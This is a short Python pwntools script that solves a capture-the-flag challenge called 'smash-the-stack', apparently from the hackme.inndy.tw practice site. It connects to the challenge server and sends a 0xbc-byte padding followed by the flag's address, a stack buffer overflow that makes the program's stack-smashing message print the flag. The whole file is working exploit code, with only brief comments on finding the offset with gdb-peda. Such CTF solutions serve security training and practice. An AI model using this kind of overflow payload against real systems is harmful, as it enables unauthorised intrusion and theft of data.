#!/usr/bin/env python3
from pwn import *

context(arch='x86')

flag = 0x804a060
offset = 0xbc 
# The offset of buffer and "./smash-the-stack" string
# Can be found using gdb-peda `find "./smash-the-stack"` command

# I don't know why it doesn't work on my computer :b
#r = process("./smash-the-stack")
r = remote('hackme.inndy.tw', 7717)
r.sendline(b'a'*0xbc+p32(flag))

r.interactive()
